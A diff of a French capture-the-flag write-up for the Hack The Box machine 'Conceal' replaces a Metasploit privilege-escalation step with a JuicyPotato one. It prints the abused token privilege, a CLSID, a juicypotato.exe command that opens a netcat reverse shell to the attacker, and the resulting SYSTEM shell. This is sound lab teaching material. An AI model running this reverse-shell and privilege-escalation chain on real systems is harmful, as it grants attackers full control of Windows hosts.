@@ -328,21 +328,48 @@ Après avoir exécuté le code powershell nous avons un shell, mais le problème
 
 PrivEsc
 ----
-Pour le privesc il y'a une faille de sécurité ALPC sur la machine donc il y'a un module pour exploiter ça sur metasploit.
+Le privesc n'est pas très compliqué sur la machine nous allons taper la commande ci-dessous. En exécutant whoami /priv, nous voyons que les droits de l'utilisateur nous permettront d'utiliser l'exploit RottenPotato pour s'élever à NTAUTORITY/SYSTEM. 
+C:\Windows\SysWOW64\inetsrv>whoami /priv
 
-	msf > use exploit/windows/local/alpc_taskscheduler
-	msf exploit(windows/local/alpc_taskscheduler) > set SESSION 1
-	msf exploit(windows/local/alpc_taskscheduler) > set LHOST 10.10.15.229
-	msf exploit(windows/local/alpc_taskscheduler) > exploit
-	[...SNIP...]
-	[*] Meterpreter session 2 opened (10.10.15.229:4444 -> 10.10.10.116:49675) at 2019-05-18 13:50:59 +0200
 	
-	meterpreter > shell
-	Process 1567 created.
-	Channel 1 created.
+	C:\Users\Windows\System32>whoami /priv
+
+	PRIVILEGES INFORMATION
+	----------------------
+
+	Privilege Name                Description                               State   
+	============================= ========================================= ========
+	SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+	SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+	SeShutdownPrivilege           Shut down the system                      Disabled
+	SeAuditPrivilege              Generate security audits                  Disabled
+	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+	SeUndockPrivilege             Remove computer from docking station      Disabled
+	SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+	SeTimeZonePrivilege           Change the time zone                      Disabled
+
+Nous devons choisir le CLSID approprié pour notre système d'exploitation. Nous allons d'abord vérifier quelle version de Windows est en cours d'exécution actuellement : 
+
+	C:\inetpub\wwwroot\upload>systeminfo
+	
+	Host Name:                 CONCEAL
+	OS Name:                   Microsoft Windows 10 Enterprise
+	OS Version:                10.0.15063 N/A Build 15063
+	
+Ensuite, nous vérifions sur le site https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md la liste des CLSID pour le système d'exploitation. <br />
+
+Nous allons utiliser {5BC7A3A1-E905-414B-9790-E511346F5CA6}, sans aucune raison particulière, puis exécuter JuicyPotato et exécuter un autre netcat pour générer un nouveau shell inversé pour nous.
+
+	C:\inetpub\wwwroot\upload>juicypotato.exe -l 1234 -p nc.exe -a "-e cmd.exe 10.10.14.39 9001" -t * -c {5BC7A3A1-E905-414B-9790-E511346F5CA6}
+	[...SNIP...]
+	[+] CreateProcessWithTokenW OK
+
+	root@Seyptoo:~/htb/box/Conceal# nc -lvnp 9001
+	listening on [any] 9001 ...
+	connect to [10.10.14.39] from (UNKNOWN) [10.10.10.116] 45135
 	Microsoft Windows [Version 10.0.15063]
 	(c) 2017 Microsoft Corporation. All rights reserved.
-	
-	C:\Windows\SysWOW64\inetsrv> whoami
+
+	C:\Windows\system32>whoami
 	nt authority\system
-	
